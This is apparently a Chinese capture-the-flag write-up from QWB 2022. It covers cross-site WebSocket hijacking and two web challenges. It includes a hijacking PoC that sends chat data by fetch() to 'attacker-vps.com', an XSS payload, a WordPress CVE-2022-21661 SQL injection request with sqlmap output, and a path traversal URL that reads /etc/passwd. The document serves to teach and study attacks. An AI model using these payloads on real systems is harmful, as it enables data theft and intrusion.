<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">101</span> Switching Protocols</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Sec-WebSocket-Accept</span><span class="punctuation">: </span>0FFP+2nmNIf/h+4BP36k9uzrYGk=</span><br></pre></td></tr></table></figure>

<p>之后，这个WebSocket的网络连接会保持开启状态，任意一方都可以直接发送WebSocket信息。</p>
<blockquote>
<p>关于WebSocket握手时的一些特性：</p>
<ul>
<li><code>Connection</code>和<code>Upgrade</code>头部用来标识这是一个WebSocket握手消息。</li>
<li><code>Sec-WebSocket-Version</code>请求头明确了一个客户端希望使用的WebSocket协议版本。版本<code>13</code>最常用。</li>
<li><code>Sec-WebSocket-Key</code>请求头包含了一个base64编码的随机值，在每个WebSocket握手请求中，它一定是随机生成的。</li>
<li><code>Sec-WebSocket-Accept</code>响应头的值是客户端发送的握手请求中<code>Sec-WebSocket-key</code>的哈希值，并与协议规范中定义的特定字符串连接。这样做的目的是匹配每一对握手请求，防止由于错误的配置或者缓存代理导致的连接错误。</li>
</ul>
</blockquote>
<h4 id="WebSocket的消息体是什么样的"><a href="#WebSocket的消息体是什么样的" class="headerlink" title="WebSocket的消息体是什么样的"></a>WebSocket的消息体是什么样的</h4><p>一旦一个WebSocket建立成功后，客户端和服务端任意一方都可以立即异步的发送消息。</p>
<p>例如，客户端可以通过JavaScirpt来简单的发送一个的消息：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ws.<span class="title function_">send</span>(<span class="string">&quot;From b1ue0cean&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>本质上，WebSocket消息体可以包含任意数据格式的内容。在现代应用程序中，通过WebSocket发送JSON格式的消息体比较常见。</p>
<p>例如，一个聊天机器人的WEB程序可以使用WebSocket发送如下的内容:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;b1ue0cean&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;Hello b1ue0cean!&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="如何操控WebSocket"><a href="#如何操控WebSocket" class="headerlink" title="如何操控WebSocket"></a>如何操控WebSocket</h3><p>一个比较关心的问题</p>
<blockquote>
<p>寻找WebSockets的安全漏洞最常用的方法就是，操纵WebSocket的通信流，通过非预期的输入来进行安全测试。本章节主要讨论，如何操纵WebSocket的通信流，以及和操纵普通的HTTP通信相比，操控WebSocket通信时要注意哪些问题。</p>
</blockquote>
<ul>
<li>拦截和修改WebSocket信息</li>
<li>重放和生成一个新的WebSocket消息</li>
<li>操控WebSocket连接</li>
</ul>
<h4 id="1-拦截和修改WebSocket信息"><a href="#1-拦截和修改WebSocket信息" class="headerlink" title="1.拦截和修改WebSocket信息"></a>1.拦截和修改WebSocket信息</h4><p><img src="/2022/07/30/qwb2022/image-20220801164022859.png" alt="image-20220801164022859"></p>
<p>并可以进行重放</p>
<blockquote>
<p>注意：你可以在Proxy -&gt; Options -&gt; Intercept WebSockets Messages 中配置只拦截客户端 -&gt; 服务端， 或者服务端 -&gt;  客户端方向的WebSocket消息。（默认情况下两个方向都拦截）</p>
</blockquote>
<h4 id="2-重放和生成一个新的WebSocket消息"><a href="#2-重放和生成一个新的WebSocket消息" class="headerlink" title="2.重放和生成一个新的WebSocket消息"></a>2.重放和生成一个新的WebSocket消息</h4><p><img src="/2022/07/30/qwb2022/image-20220801164411493.png" alt="image-20220801164411493"></p>
<h4 id="3-操控WebSocket连接"><a href="#3-操控WebSocket连接" class="headerlink" title="3.操控WebSocket连接"></a>3.操控WebSocket连接</h4><p>当然，除了操控WebSocket双向中传递的消息体之外，我们也可以操纵WebSocket的握手环节。这可以引入一些有趣的高级的攻击手法。例如：WebSocket跨域劫持，这会在第四章节中讲解。</p>
<p>有很多场景下，操控WebSocket握手连接是非常有必要的：</p>
<ul>
<li>它可以扩展你的攻击面</li>
<li>一些攻击手法可能会导致你的连接断开，所以你需要去重新建立一个新的连接</li>
<li>Token或者其它的数据在原始的握手请求中可能被窃取或者需要更新</li>
</ul>
<p>你可以通过刚才讲到的Burp Repeater操控WebSocket握手：</p>
<ul>
<li>发送一个WebSocket消息到Burp Repeater中。</li>
<li>在Burp Repeater中，点击消息框右上角的小铅笔图标，选择一个WebSocket URL。然后在这个功能栏的下边你可以选择接入已经建立连接的WebSocket、克隆已经建立连接的WebSocket、或者重新连接一个已经断开连接的WebSocket。然后向导会根据你的操作给你一个详细的步骤，跟着做，修改消息体、或者是输入一个新的握手包。</li>
<li>输入或修改结束后点击Connect，Burp会发送你的配置的握手包，然后展示详细的执行结果。如果一个新的WebSocket连接被成功的建立，你可以在Repeater中来通过这个Socket发送新的消息包。</li>
</ul>
<h3 id="常见的WebSocket漏洞案例"><a href="#常见的WebSocket漏洞案例" class="headerlink" title="常见的WebSocket漏洞案例"></a>常见的WebSocket漏洞案例</h3><p>有一种WebSocket攻击类似于JSONP劫持，属于CSRF攻击的一种，它被称为<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking">cross-site WebSocket hijacking (opens new window)</a>攻击。</p>
<h3 id="1、什么是跨站WebSocket劫持？"><a href="#1、什么是跨站WebSocket劫持？" class="headerlink" title="1、什么是跨站WebSocket劫持？"></a>1、什么是跨站WebSocket劫持？</h3><p>跨站WebSocket劫持（也称为跨域WebSocket劫持）是一种由于WebSocket握手流程的安全缺陷所导致的跨站点请求伪造（CSRF）漏洞。</p>
<p>当WebSocket握手请求仅依靠HTTP cookie进行会话处理并且不包含任何CSRF token或其他不可预测的值时，就会出现这种漏洞。</p>
<p>攻击者可以在自己的站点上创建一个恶意网页，从而建立与易受攻击的应用程序的跨站点WebSocket连接。 该应用程序将在受害用户与该应用程序的会话的上下文中处理连接。</p>
<p>然后，攻击者的页面可以通过WebSocket连接向服务器发送任意消息，并读取从服务器接收回的消息内容。 这意味着，与常规的CSRF不同，攻击者可以与受攻击的应用程序进行双向交互。</p>
<h3 id="2、跨站WebSocket劫持的危害"><a href="#2、跨站WebSocket劫持的危害" class="headerlink" title="2、跨站WebSocket劫持的危害"></a>2、跨站WebSocket劫持的危害</h3><p>一个成功的跨站WebSocket劫持攻击通常会使攻击者能够：</p>
<ul>
<li>伪装成受害者用户来执行未经授权的行为，与常规CSRF一样，攻击者可以将任意消息发送到服务器端应用程序。 如果应用程序使用客户端生成的WebSocket消息执行任何敏感操作，则攻击者可以跨域生成合适的消息并触发这些操作。例如绑定手机号、修改密码等。</li>
<li>访问受害者的敏感数据。 与常规CSRF不同，跨站点WebSocket劫持使攻击者可以通过被劫持的WebSocket与易受攻击的应用程序进行双向交互。 如果应用程序使用服务器生成的WebSocket消息将任何敏感数据返回给用户，则攻击者可以拦截这些消息并捕获受害用户的数据。这意味着无需跨域方法的支持(JSONP、CORS)，也可以读取受害者的数据。</li>
</ul>
<h3 id="3、如何进行一个跨站WebSocket劫持攻击"><a href="#3、如何进行一个跨站WebSocket劫持攻击" class="headerlink" title="3、如何进行一个跨站WebSocket劫持攻击"></a>3、如何进行一个跨站WebSocket劫持攻击</h3><p>由于跨站点WebSocket劫持攻击本质上是WebSocket握手上的CSRF漏洞，因此执行攻击的第一步是检查应用程序执行的WebSocket握手过程是否针对CSRF进行了保护。</p>
<p>就正常的CSRF攻击流程而言，通常需要找到一个握手消息，该消息仅依赖HTTP cookie进行会话处理，并且在请求参数中不使用任何token或其他不可预测的值。</p>
<p>例如，以下WebSocket握手请求可能容易受到CSRF的攻击，因为唯一的session token是在cookie中传输的：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>wDqumtseNBJdhkihL6PW7w==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive, Upgrade</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意:<code>Sec-WebSocket-Key</code> 请求头包含的随机值主要用于防止代理服务器缓存错误，并且不用于身份验证或会话处理目的。</p>
</blockquote>
<p>如果WebSocket握手请求易受CSRF的攻击，则攻击者的网页可以执行跨站点请求，与易受攻击的服务器后端接口建立WebSocket。 攻击中接下来发生的事情完全取决于应用程序的逻辑以及它如何使用WebSockets。 攻击可能涉及：</p>
<ul>
<li>发送WebSocket消息以代表受害用户执行未经授权的操作。</li>
<li>发送WebSocket消息以检索敏感数据。</li>
<li>有时，可能只需要等待包含敏感数据的消息发送过来。</li>
</ul>
<p>例如，一个跨站WebSocket劫持读取用户聊天记录的POC如下，用户在建立WebSocket连接后，向服务器发送’READY’字符串，即可接收到服务器传来的历史聊天记录。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Create WebSocket connection.</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;wss://vulnerable-site.com/chat&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Connection opened</span></span></span><br><span class="line"><span class="language-javascript">ws.<span class="title function_">addEventListener</span>(<span class="string">&#x27;open&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="title function_">send</span>(<span class="string">&#x27;READY&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Listen for messages</span></span></span><br><span class="line"><span class="language-javascript">ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker-vps.com/?log&#x27;</span>+event.<span class="property">data</span>, &#123;<span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>&#125;)</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="跨站WebSockets攻击"><a href="#跨站WebSockets攻击" class="headerlink" title="跨站WebSockets攻击"></a>跨站WebSockets攻击</h3><h4 id="操控WebSocket消息体寻找漏洞"><a href="#操控WebSocket消息体寻找漏洞" class="headerlink" title="操控WebSocket消息体寻找漏洞"></a>操控WebSocket消息体寻找漏洞</h4><p>通过篡改 WebSocket 消息的内容，可以发现并利用大多数基于输入的漏洞。</p>
<p>例如，一个具有聊天功能的Web程序使用WebSocket在客户端和服务端之间传输消息。当一个用户输入聊天消息时，如下的一个WebSocket消息被发送到服务端：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;Hello Tom！&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>服务端会将这个消息内容通过WebSocket转发给另外一个用户Tom，然后在Tom的浏览器中被JS渲染为一段HTML代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>Hello Carlos<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当服务器没有对转发的内容做安全防御或过滤时，可能就会引发XSS攻击。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;&lt;img src=1 onerror=&#x27;alert(1)&#x27;&gt;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>





<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>源码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> ws = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&quot;ws://&quot;</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">host</span> + <span class="string">&quot;/bot&quot;</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">sendtobot</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ws) &#123;</span><br><span class="line">                <span class="keyword">var</span> msg = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;sendbox&quot;</span>).<span class="property">value</span>;</span><br><span class="line">                ws.<span class="title function_">send</span>(msg);</span><br><span class="line">    	        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;sendbox&quot;</span>).<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        	    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;chatbox&quot;</span>).<span class="title function_">append</span>(<span class="string">&quot;你: &quot;</span> + msg + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(url);</span><br><span class="line">                ws.<span class="property">onopen</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;connection open!&#x27;</span>)</span><br><span class="line">                    <span class="keyword">var</span> msg = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;sendbox&quot;</span>).<span class="property">value</span>;</span><br><span class="line">                    ws.<span class="title function_">send</span>(msg);</span><br><span class="line">                    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;sendbox&quot;</span>).<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;chatbox&quot;</span>).<span class="title function_">append</span>(<span class="string">&quot;你: &quot;</span> + msg + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                ws.<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params">ev</span>) &#123;</span><br><span class="line">                    <span class="title function_">botsay</span>(ev.<span class="property">data</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">                ws.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;connection error&quot;</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">                ws.<span class="property">onclose</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;connection close!&quot;</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">closeWebSocket</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(ws)&#123;</span><br><span class="line">                ws.<span class="title function_">close</span>();</span><br><span class="line">                ws = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">botsay</span>(<span class="params">content</span>) &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;chatbox&quot;</span>).<span class="title function_">append</span>(<span class="string">&quot;bot: &quot;</span> + content + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>先改一个我自己的密码试试</p>
<h2 id="easylogin"><a href="#easylogin" class="headerlink" title="easylogin"></a>easylogin</h2><blockquote>
<p><a target="_blank" rel="noopener" href="http://47.104.251.7/">http://47.104.251.7/</a><br>本题目为渗透题，开放了80和8888两个端口，其余端口均和本题目无关，本题目无需进行目录扫描和爆破<br>(题目每10分钟都会自动恢复初始环境，如果遇到环境不对，请稍等片刻或联系群管寻找出题人，flag位置在常用文件夹下，并非国际通用位置，可以通过创建时间来推断，需要稍微寻找一下)</p>
</blockquote>
<p>最初先用wpscan扫一下 发现sql注入漏洞</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">| [!] Title: WordPress &lt; <span class="number">5.8</span>.<span class="number">3</span> - SQL Injection via WP_Query</span><br><span class="line">|     Fixed <span class="keyword">in</span>: <span class="number">5.8</span>.<span class="number">3</span></span><br><span class="line">|     References:</span><br><span class="line">|      - https:<span class="regexp">//</span>wpscan.com<span class="regexp">/vulnerability/</span><span class="number">7</span>f768bcf-ed33-<span class="number">4</span>b22-b432-d1e7f95c1317</span><br><span class="line">|      - https:<span class="regexp">//</span>cve.mitre.org<span class="regexp">/cgi-bin/</span>cvename.cgi?name=CVE-<span class="number">2022</span>-<span class="number">21661</span></span><br><span class="line">|      - https:<span class="regexp">//gi</span>thub.com<span class="regexp">/WordPress/</span>wordpress-develop<span class="regexp">/security/</span>advisories/GHSA-<span class="number">6676</span>-cqfm-gw84</span><br><span class="line">|      - https:<span class="regexp">//</span>hackerone.com<span class="regexp">/reports/</span><span class="number">1378209</span></span><br></pre></td></tr></table></figure>

<p>首先是80端口的 sql注入</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10841">某Press核心框架WP_Query SQL注入漏洞分析（CVE-2022–21661） - 先知社区 (aliyun.com)</a></p>
<p>打这里 <a target="_blank" rel="noopener" href="http://47.104.251.7/wp-admin/admin-ajax.php">http://47.104.251.7/wp-admin/admin-ajax.php</a></p>
<p><img src="/2022/07/30/qwb2022/image-20220801132739600.png" alt="image-20220801132739600"></p>
<p>直接放sqlmap里面可以跑</p>
<p>payload</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=aa&amp;query_vars<span class="comment">[tax_query]</span><span class="comment">[1]</span><span class="comment">[include_children]</span>=1&amp;query_vars<span class="comment">[tax_query]</span><span class="comment">[1]</span><span class="comment">[terms]</span><span class="comment">[1]</span>=1*&amp;query_vars<span class="comment">[tax_query]</span><span class="comment">[1]</span><span class="comment">[field]</span>=term_taxonomy_id</span><br></pre></td></tr></table></figure>

<p>抓一下包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-admin/admin-ajax.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.104.251.7</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>181</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://47.104.251.7</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://47.104.251.7/wp-admin/admin-ajax.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-maxima">action=aa&amp;query_vars%5Btax_query%5D%<span class="number">5B1</span>%5D%5Binclude_children%5D=<span class="number">1</span>&amp;query_vars%5Btax_query%5D%<span class="number">5B1</span>%5D%5Bterms%5D%<span class="number">5B1</span>%5D=<span class="number">1</span>*&amp;query_vars%5Btax_query%5D%<span class="number">5B1</span>%5D%5Bfield%5D=term_taxonomy_id</span></span><br></pre></td></tr></table></figure>

<p>这里可以打一手时间或报错都行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --technique=E</span><br></pre></td></tr></table></figure>



<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sqlmap</span> <span class="string">identified</span> <span class="string">the</span> <span class="string">following</span> <span class="string">injection</span> <span class="string">point(s)</span> <span class="string">with</span> <span class="string">a</span> <span class="string">total</span> <span class="string">of</span> <span class="number">425</span> <span class="string">HTTP(s)</span> <span class="attr">requests:</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">Parameter:</span> <span class="comment">#1* ((custom) POST)</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">error-based</span></span><br><span class="line">    <span class="attr">Title:</span> <span class="string">MySQL</span> <span class="string">&gt;=</span> <span class="number">5.0</span> <span class="string">AND</span> <span class="string">error-based</span> <span class="bullet">-</span> <span class="string">WHERE,</span> <span class="string">HAVING,</span> <span class="string">ORDER</span> <span class="string">BY</span> <span class="string">or</span> <span class="string">GROUP</span> <span class="string">BY</span> <span class="string">clause</span> <span class="string">(FLOOR)</span></span><br><span class="line">    <span class="attr">Payload:</span> <span class="string">action=aa&amp;query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=1)</span> <span class="string">AND</span> <span class="string">(SELECT</span> <span class="number">3702 </span><span class="string">FROM(SELECT</span> <span class="string">COUNT(*),CONCAT(0x7170627071,(SELECT</span> <span class="string">(ELT(3702=3702,1))),0x7171786a71,FLOOR(RAND(0)*2))x</span> <span class="string">FROM</span> <span class="string">INFORMATION_SCHEMA.PLUGINS</span> <span class="string">GROUP</span> <span class="string">BY</span> <span class="string">x)a)--</span> <span class="string">SGzg&amp;query_vars[tax_query][1][field]=term_taxonomy_id</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<p>发现有这么几个数据库</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">available databases <span class="comment">[3]</span>:</span><br><span class="line"><span class="comment">[*]</span> information_schema</span><br><span class="line"><span class="comment">[*]</span> moodle</span><br><span class="line"><span class="comment">[*]</span> wordpress</span><br></pre></td></tr></table></figure>

<p>我发现从wordpress里我只能得到加过盐的密码 没啥用</p>
<p>看看moodle数据库  翻了半天 发现我也只能找到加过盐的密码 其他的没得到什么有用的信息</p>
<p>几个我比较感兴趣的数据库</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">| mdl_user_info_field              </span></span><br><span class="line"><span class="string">| mdl_user_lastaccess              </span></span><br><span class="line"><span class="string">| mdl_user_password_history        </span></span><br><span class="line"><span class="string">| mdl_user_password_resets         </span></span><br><span class="line"><span class="string">| mdl_user_preferences             </span></span><br><span class="line"><span class="string">| mdl_user_private_key </span></span><br></pre></td></tr></table></figure>

<p>看到了 <code>mdl_user_password_resets    </code> 表</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Database: moodle</span><br><span class="line">Table: mdl_user_password_resets</span><br><span class="line"><span class="meta">[5 columns]</span></span><br><span class="line"><span class="code">+-----------------+</span>-------------+</span><br><span class="line"><span class="section">| Column          | Type        |</span></span><br><span class="line"><span class="section">+-----------------+-------------+</span></span><br><span class="line">| id              | bigint(10)  |</span><br><span class="line">| timerequested   | bigint(10)  |</span><br><span class="line">| timererequested | bigint(10)  |</span><br><span class="line">| token           | varchar(32) |</span><br><span class="line"><span class="section">| userid          | bigint(10)  |</span></span><br><span class="line"><span class="section">+-----------------+-------------+</span></span><br></pre></td></tr></table></figure>

<p>发现这里面有 服了 原来是网站出问题了  草</p>
<p>我看这里NESE是去审计了代码</p>
<p><img src="/2022/07/30/qwb2022/image-20220801171434655.png" alt="image-20220801171434655"></p>
<p>然后就是打一个nday 学到了学到了</p>
<h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><blockquote>
<p>照片墙的内部系统中可能还有什么系统。</p>
<p><a target="_blank" rel="noopener" href="http://47.104.95.124:8080/">http://47.104.95.124:8080/</a></p>
</blockquote>
<p>upload.php</p>
<p><img src="/2022/07/30/qwb2022/image-20220730141152514.png" alt="image-20220730141152514"></p>
<p><a target="_blank" rel="noopener" href="http://47.104.95.124:8080/showfile.php?f=demo/../../../../../../../../../../etc/passwd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">http://47.104.95.124:8080/showfile.php?f=demo/../../../../../../../../../../etc/passwd任意文件读取</a></p>
<p>/etc/hosts</p>
